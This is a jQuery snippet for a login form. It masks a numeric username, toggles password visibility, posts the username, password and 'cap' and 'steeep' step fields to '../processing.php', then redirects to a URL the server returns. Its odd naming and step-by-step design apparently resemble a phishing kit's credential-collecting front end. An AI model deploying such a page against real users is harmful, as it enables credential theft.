
            $('#username').mask('0000000000000');
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'username' : $('#username').val(),
                    'password' : $('#password').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
            $('.eye').click(function(){
                if( $('#password').attr('type') == 'password' ) {
                    $('#password').attr('type','text');
                    $('.eye').html('<i class="fa-regular fa-eye-slash"></i>');
                } else {
                    $('#password').attr('type','password');
                    $('.eye').html('<i class="fa-regular fa-eye"></i>');
                }
            });
        